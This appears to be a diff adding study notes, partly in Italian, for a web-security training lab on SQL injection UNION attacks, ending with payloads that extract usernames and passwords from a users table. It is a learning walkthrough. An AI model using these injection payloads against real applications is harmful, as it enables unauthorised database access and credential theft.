@@ -1,0 +1,46 @@
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+
+
+IPOTESI QUERY:
+
+SELECT a,b FROM Table1;
+
+
+(collegamento a lab 3)
+DETERMINARE IL NUMERO DI COLONNE.
+
+1) SELECT a,b FROM Table1;
+' ORDER BY 2--
+= SELECT a,b FROM Table1' ORDER BY 2--;
+
+2) SELECT a,b FROM Table1;
+' UNION SELECT NULL,NULL--
+= SELECT a,b FROM Table1' UNION SELECT NULL,NULL--;
+
+
+(collegamento a lab 4)
+DETERMINARE QUALE COLONNA PUO' CONTENERE DEL TESTO.
+
+3) SELECT a,b FROM Table1;
+' UNION SELECT 'a','a'--
+= SELECT a,b FROM Table1' UNION SELECT 'a','a'--;
+
+
+DETERMINARE SE ESISTE LA TABELLA users.
+
+4) SELECT a,b FROM Table1;
+' UNION SELECT NULL,NULL FROM users--
+= SELECT a,b FROM Table1' UNION SELECT NULL,NULL FROM users--;
+
+ESTRARRE PASSWORD UTENTE administrator.
+
+5) SELECT a,b FROM Table1;
+' UNION SELECT username,password FROM users--
+= SELECT a,b FROM Table1' UNION SELECT username,password FROM users--;
